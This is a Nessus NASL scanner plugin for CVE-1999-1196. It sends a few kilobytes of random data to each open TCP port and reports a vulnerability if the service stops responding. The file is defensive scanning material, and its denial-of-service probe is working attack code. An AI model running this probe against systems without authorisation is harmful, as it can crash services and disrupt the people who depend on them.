#
# This script was written by Michel Arboi <mikhail@nessus.org>
# GNU Public Licence
#
################
# References
################
#
# http://www.securityfocus.com/bid/158/
# Exceed Denial of Service Vulnerability
# CVE-1999-1196

if(description)
{
 script_id(17296);
 script_bugtraq_id(158);
 script_cve_id("CVE-1999-1196");
 script_version ("$Revision: 1.3 $");
 
 name["english"] = "Kill service with random data";
 script_name(english:name["english"]);
 
 desc["english"] = "
It was possible to crash the remote service by sending it
a few kilobytes of random data.

An attacker may use this flaw to make this service crash continuously, 
preventing this service from working properly. It may also be possible
to exploit this flaw to execute arbitrary code on this host.

Solution : upgrade your software or contact your vendor and inform it of this 
vulnerability
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Sends random data to the remote service";
 script_summary(english:summary["english"]);
 
 # Maybe we should set this to ACT_DESTRUCTIVE_ATTACK only?
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2005 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "find_service2.nasl");
 exit(0);
}

#
include("global_settings.inc");
if (! experimental_scripts) exit(0);

beurk = '';
for (i = 0; i < 256; i ++)
 beurk = strcat(beurk, 
  ord(rand() % 256), ord(rand() % 256), ord(rand() % 256), ord(rand() % 256),
  ord(rand() % 256), ord(rand() % 256), ord(rand() % 256), ord(rand() % 256));
# 2 KB

ports = get_kb_list("Ports/tcp/*");
if (isnull(ports)) exit(0);

foreach port (keys(ports))
{
 port = int(port - "Ports/tcp/");
 soc = open_sock_tcp(port);
 if (soc)
 {
   send(socket: soc, data: beurk);
   close(soc);

  # Is the service still alive?
  # Retry just in case it is rejecting connections for a while
  for (i = 1; i <= 3; i ++)
  {
    soc = open_sock_tcp(port);
    if (soc) break;
    sleep(i);
  }
  if (! soc)
   security_hole(port);
  else
   close(soc);
 }
}
